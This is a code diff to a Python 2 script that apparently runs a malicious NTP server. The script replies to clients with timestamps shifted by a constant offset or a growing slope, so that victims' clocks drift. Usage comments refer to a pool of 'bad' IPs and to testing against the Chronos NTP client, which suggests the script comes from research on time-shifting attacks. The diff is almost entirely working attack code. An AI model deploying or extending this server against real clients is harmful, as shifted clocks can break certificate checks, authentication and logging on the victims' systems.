@@ -264,15 +264,36 @@ class RecvThread(threading.Thread):
 
 
 class WorkThread(threading.Thread):
-    def __init__(self, sockets):
+    def __init__(self, sockets, shift_type='CONSTANT', c_shift=0, slop=0, slop_t_0=0, packet_params=None):
         threading.Thread.__init__(self)
         self.sockets = sockets
+        self.shift_type = shift_type
+        self.c_shift = c_shift
+        self.slop = slop
+        self.slop_t_0 = slop_t_0
+        if packet_params:
+            self.packet_params=packet_params
+        else:
+            self.packet_params = {}
 
     def get_time_shift(self, t):
-        if shift_type == 'CONSTANT':
-            return c_shift
-        time_shift = (slop * (t - slop_t_0)) if t > slop_t_0 else 0
+        if self.shift_type == 'CONSTANT':
+            return self.c_shift
+        time_shift = (self.slop * (t - self.slop_t_0)) if t > self.slop_t_0 else 0
+        print time_shift
         return time_shift
+
+    def create_send_packet(self, version=3, mode=4, stratum=1, poll=10):
+        sendPacket = NTPPacket(version=version, mode=mode)
+        sendPacket.stratum = stratum
+        sendPacket.poll = poll
+        '''
+        sendPacket.precision = 0xfa
+        sendPacket.root_delay = 0x0bfa
+        sendPacket.root_dispersion = 0x0aa7
+        sendPacket.ref_id = 0x808a8c2c
+        '''
+        return sendPacket
 
     def run(self):
         global taskQueue, stopFlag
@@ -284,17 +305,11 @@ class WorkThread(threading.Thread):
                 data, addr, sid, recvTimestamp = taskQueue.get(timeout=1)
                 recvPacket = NTPPacket()
                 recvPacket.from_data(data)
-                time_shift = self.get_time_shift(t=recvTimestamp)
+                time_shift = self.get_time_shift(t=recvTimestamp- NTP.NTP_DELTA)
                 timeStamp_high, timeStamp_low = recvPacket.GetTxTimeStamp()
-                sendPacket = NTPPacket(version=3, mode=4)
-                sendPacket.stratum = 2
-                sendPacket.poll = 10
-                '''
-                sendPacket.precision = 0xfa
-                sendPacket.root_delay = 0x0bfa
-                sendPacket.root_dispersion = 0x0aa7
-                sendPacket.ref_id = 0x808a8c2c
-                '''
+
+                sendPacket = self.create_send_packet(**self.packet_params)
+
                 sendPacket.ref_timestamp = recvTimestamp - 5
                 sendPacket.SetOriginTimeStamp(timeStamp_high, timeStamp_low)
                 sendPacket.recv_timestamp = recvTimestamp + time_shift
@@ -302,8 +317,8 @@ class WorkThread(threading.Thread):
                 sendPacket.tx_timestamp = system_to_ntp_time(now + time_shift)
                 socket = self.sockets[sid]
                 socket.sendto(sendPacket.to_data(), addr)
-                logger.info("recv: {recvTimestamp} -> {s_recvTimestamp}".format(recvTimestamp=recvTimestamp, s_recvTimestamp=sendPacket.recv_timestamp))
-                logger.info("tx: {real} -> {new}".format(real=system_to_ntp_time(now), new=sendPacket.tx_timestamp))
+                logger.info("recv: {recvTimestamp:f} -> {s_recvTimestamp:f}".format(recvTimestamp=recvTimestamp, s_recvTimestamp=sendPacket.recv_timestamp))
+                logger.info("tx: {real:f} -> {new:f}".format(real=system_to_ntp_time(now), new=sendPacket.tx_timestamp))
                 logger.info("Sended to {a0}:{a1}".format(a0=addr[0], a1=addr[1]))
             except Queue.Empty:
                 continue
@@ -311,11 +326,14 @@ class WorkThread(threading.Thread):
 import json
 
 # python ntp_multi_attack_server.py CONSTANT 1 1 1 bad_ips_pool.json
+# python ntp_multi_attack_server.py BLA 1 180 0.01 bad_ips_pool.json
 # CHRONOS:
 # sudo python /media/sf_temp/chronos_d.py -m 5 -d 0.2 -p /media/sf_temp/chronos_servers_pool1.json -S /media/sf_temp/current_s_0.json -w 0.025 -e 0.05 -o /media/sf_temp/ -n 30
 
 if __name__ == "__main__":
     # USAGE ntp_adversary.py [shift_type] [c_shift] [slop_t] [slop] [interfaces_file]
+    line_args = [datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")] + sys.argv
+    file(sys.argv[0]+".log", "a+").write(" ".join(line_args))
     shift_type = sys.argv[1]
     c_shift = float(sys.argv[2])
     slop_t = float(sys.argv[3])
@@ -331,7 +349,7 @@ if __name__ == "__main__":
     #logger.info("local socket: {sockname}".format(sockname=socket.getsockname()))
     recvThread = RecvThread(sockets)
     recvThread.start()
-    workThread = WorkThread(sockets)
+    workThread = WorkThread(sockets, shift_type=shift_type, slop_t_0=time.time()+slop_t, slop=slop, c_shift=c_shift)
     workThread.start()
 
     while True:
